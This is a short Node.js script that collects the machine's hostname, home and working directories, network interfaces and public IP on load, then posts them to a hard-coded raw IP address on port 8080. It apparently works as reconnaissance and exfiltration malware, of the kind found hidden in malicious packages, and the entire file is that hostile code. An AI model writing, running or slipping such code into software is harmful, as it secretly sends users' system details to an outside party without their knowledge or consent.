const os = require('os');
const axios = require('axios');

async function getPublicIP() {
  const response = await axios.get('https://ipinfo.io/json');
  return response.data.ip;
}

async function report() {
  const profile = {
    hostname: os.hostname(),
    homeDirectory: os.homedir(),
    currentDirectory: process.cwd(),
    interfaces: os.networkInterfaces(),
    publicIP: await getPublicIP()
  };
  await axios.post('http://35.170.187.220:8080/', profile);
}

report();
